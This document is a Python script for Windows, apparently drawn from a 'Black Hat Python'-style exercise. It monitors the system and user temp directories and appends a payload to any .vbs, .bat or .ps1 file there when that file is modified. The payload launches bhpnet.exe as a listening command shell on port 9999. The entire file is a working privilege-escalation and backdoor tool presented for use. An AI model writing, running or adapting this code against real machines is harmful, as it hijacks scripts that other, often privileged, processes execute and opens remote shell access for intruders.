import tempfile
import threading
import win32file
import win32con
import os
import traceback

# Monitored temp directories
dirs_to_monitor = ["C:\\WINDOWS\\Temp", tempfile.gettempdir()]

# File operation constants
FILE_CREATED        = 1
FILE_DELETED        = 2
FILE_MODIFIED       = 3
FILE_RENAMED_FROM   = 4
FILE_RENAMED_TO     = 5

# Payload to inject based on extension
file_types = {
    '.vbs': ["\r\n'bhpmarker\r\n", '\r\nCreateObject("Wscript.Shell").Run("C:\\WINDOWS\\TEMP\\bhpnet.exe -l -p 9999 -c")\r\n'],
    '.bat': ["\r\nREM bhpmarker\r\n", "\r\nC:\\WINDOWS\\TEMP\\bhpnet.exe -l -p 9999 -c\r\n"],
    '.ps1': ["\r\n#bhpmarker", 'Start-Process "C:\\WINDOWS\\TEMP\\bhpnet.exe -l -p 9999 -c"']
}

def inject_code(full_filename, content, extension):
    if file_types[extension][0] in content:
        return  # Already injected

    try:
        injected_content = content + file_types[extension][0] + file_types[extension][1]
        with open(full_filename, 'w', encoding='utf-8') as f:
            f.write(injected_content)
        print(f"[(0 ^ 0)] Injected code into {full_filename}")
    except Exception as e:
        print(f"[!!] Injection failed for {full_filename}: {e}")


def start_monitoring(path):
    print(f"[*] Monitoring directory: {path}")
    FILE_LIST_DIR = 0x0001

    h_directory = win32file.CreateFile(
        path,
        FILE_LIST_DIR,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None
    )

    while True:
        try:
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_SIZE |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY,
                None,
                None
            )

            for action, filename in results:
                full_filename = os.path.join(path, filename)
                extension = os.path.splitext(filename)[1].lower()

                if action == FILE_CREATED:
                    print(f"[*] File Created: {full_filename}")
                elif action == FILE_DELETED:
                    print(f"[*] File Deleted: {full_filename}")
                elif action == FILE_MODIFIED:
                    print(f"[*] File Modified: {full_filename}")

                    try:
                        with open(full_filename, "r", encoding="utf-8", errors="ignore") as f:
                            contents = f.read()
                            print(f"[^^^] File contents of {filename} dumped.")

                        if extension in file_types:
                            inject_code(full_filename, contents, extension)

                    except Exception as e:
                        print(f"[!!!] Failed to read file {full_filename}: {e}")

                elif action == FILE_RENAMED_FROM:
                    print(f"[ > ] Renamed From: {full_filename}")
                elif action == FILE_RENAMED_TO:
                    print(f"[ < ] Renamed To: {full_filename}")
                else:
                    print(f"[???] Unknown Action on {full_filename}")

        except Exception as e:
            print(f"[ERROR] Monitoring failed: {e}")
            traceback.print_exc()


def main():
    for path in dirs_to_monitor:
        monitor_thread = threading.Thread(target=start_monitoring, args=(path,), daemon=True)
        monitor_thread.start()


if __name__ == "__main__":
    main()
